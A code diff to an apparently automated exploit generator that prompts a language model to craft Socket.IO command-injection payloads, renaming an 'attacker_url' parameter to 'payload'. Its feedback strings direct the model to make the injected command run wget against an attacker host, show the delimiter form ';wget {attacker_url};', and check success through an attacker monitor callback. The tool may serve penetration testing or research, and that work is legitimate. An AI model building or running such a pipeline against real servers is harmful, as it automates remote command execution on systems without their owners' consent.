@@ -43,7 +43,7 @@ class CommandInjectionSocketHandler(VulnHandler):
         description: str,
         code_texts: List[str],
         target: Optional[str],
-        attacker_url: str,
+        payload: str,
         target_profile: Optional[str] = None,
         validation_feedback: Optional[str] = None,
     ) -> List[dict]:
@@ -51,7 +51,7 @@ class CommandInjectionSocketHandler(VulnHandler):
             description=description,
             code_files=code_texts,
             target=target,
-            attacker_url=attacker_url,
+            payload=payload,
             target_profile=target_profile,
             validation_feedback=validation_feedback,
         )
@@ -65,7 +65,7 @@ def generate_command_injection_socket(
     vuln_type: Optional[str] = None,
     temperature: float = 0.2,
     max_tokens: int = 4000,
-    attacker_url: Optional[str] = None,
+    payload: Optional[str] = None,
     probe_target: bool = False,
     auto_validate: bool = False,
     max_iterations: Optional[int] = None,
@@ -82,7 +82,7 @@ def generate_command_injection_socket(
 ) -> GenerationResult:
     handler_key = vuln_type or CommandInjectionSocketHandler.name
     handler = CommandInjectionSocketHandler()
-    atk_url = attacker_url or SETTINGS.attacker_url
+    final_payload = payload or SETTINGS.payload
     if cvenumber:
         get_web_infomation(cvenumber)
 
@@ -103,7 +103,7 @@ def generate_command_injection_socket(
         f"description: {description}\n"
         f"target: {target or '<none>'}\n"
         f"vuln_type: {handler_key}\n"
-        f"attacker_url: {atk_url}"
+        f"payload: {final_payload}"
     )
 
     max_iters = max(1, max_iterations or SETTINGS.max_iterations)
@@ -129,7 +129,7 @@ def generate_command_injection_socket(
             description,
             code_texts,
             target,
-            atk_url,
+            final_payload,
             None,
             None,
         )
@@ -280,7 +280,7 @@ def generate_command_injection_socket(
                 feedback_for_next = _build_socket_attempt_feedback(
                     parse_issues,
                     validation_results,
-                    atk_url,
+                    final_payload,
                     monitor_running,
                     validation_error,
                 )
@@ -350,7 +350,7 @@ def _format_socket_sample_prompt(sample: TargetSample) -> Optional[str]:
 def _build_socket_attempt_feedback(
     parse_issues: List[str],
     validation_results: Optional[List[ValidationResult]],
-    attacker_url: str,
+    payload: str,
     monitor_active: bool,
     validation_error: Optional[str] = None,
 ) -> Optional[str]:
@@ -381,19 +381,19 @@ def _build_socket_attempt_feedback(
     if monitor_active:
         messages.append(
             "Attacker monitor did NOT receive the expected wget callback. Ensure the Socket.IO payload executes wget "
-            f"{attacker_url} directly (no URL encoding of separators) and that the vulnerable argument is actually controllable."
+            f"{payload} directly (no URL encoding of separators) and that the vulnerable argument is actually controllable."
         )
     else:
         messages.append(
             "Attacker monitor is unavailable, so success could not be confirmed automatically. Still refine the payload to trigger wget "
-            f"{attacker_url} if possible."
+            f"{payload} if possible."
         )
 
     if parse_issues or failed_validation:
         messages.append(
             "Before the next attempt, tighten the JSON structure and payload:\n"
             "1) Schema: keep the keys exactly as requested (url, namespace, event, headers, cookies, wait_for_response, max_response_frames, payload).\n"
-            "2) Payload: mirror the server's expected object layout and wrap the injection with the delimiter style observed in code (e.g., ';wget {attacker_url};').\n"
+            "2) Payload: mirror the server's expected object layout and wrap the injection with the delimiter style observed in code (e.g., ';{payload};').\n"
             "3) Endpoint: ensure the ws/wss URL, namespace, and event names match the code blueprint; reuse any authentication cookies or headers from the sample.\n"
             "4) Responses: if redirects or auth failures occur, update cookies/headers accordingly and retry."
         )
